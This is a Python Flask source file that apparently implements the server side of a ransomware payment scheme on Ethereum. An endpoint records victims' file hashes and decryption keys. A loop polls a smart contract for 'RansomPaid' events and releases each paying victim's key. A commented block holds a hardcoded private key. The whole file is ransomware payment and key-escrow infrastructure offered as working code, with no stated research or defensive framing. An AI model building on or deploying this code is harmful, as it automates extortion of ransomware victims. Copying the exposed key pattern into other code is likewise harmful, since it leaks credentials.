from flask import Flask, request
import json
import web3

from web3 import Web3, TestRPCProvider, Account
from solc import compile_source
from web3.contract import ConciseContract
from web3.auto import w3
import threading
app = Flask(__name__)

# Maps the hashes of the ransomer's victims to their keys
ransom_ledger = {}

contract_address = '0x3119f49c6B71d0fDa4f2515562662f41356e04Dc'
abi = None
contract = None
with open('contract-abi.json', 'r') as abi_definition:
    abi = json.load(abi_definition)
    contract = w3.eth.contract(address=contract_address, abi=abi)

transfer_filter = contract.eventFilter("RansomPaid")

# transaction = dict(data=contract._encode_constructor_data(), 'from': w3.eth.accounts[0])
#
# acct = Account.privateKeyToAccount("cb060fd3bac9632bf97790850bd74ecd6bfc217fb6014aa5dfda52d18cf23bc7") # TODO make more secure or splittable or something
# signed = acct.signTransaction(transaction)
# w3.eth.sendRawTransaction(signed.rawTransaction)
# print(contract)
# contract.transact({'from': w3.eth.accounts[0]}).provideKey(2, 13)



# Checks for new ransom every 5 seconds and sends key to contract if there is one
def check_ransoms():
    for entry in transfer_filter.get_new_entries():
        # Check if decrypts properly??
        data = entry['args']['data']
        # Rinkeby ID 4
        contract.transact({'from': w3.eth.accounts[0]}).provideKey(data, ransom_ledger[data])

    threading.Timer(5.0, check_ransoms).start()

check_ransoms()

@app.route('/ransom', methods=['get'])
def get_ransom_info():
    plainHash = request.args.get('hash')
    key = request.args.get('key')
    ransom_ledger[plainHash] = key
    return ""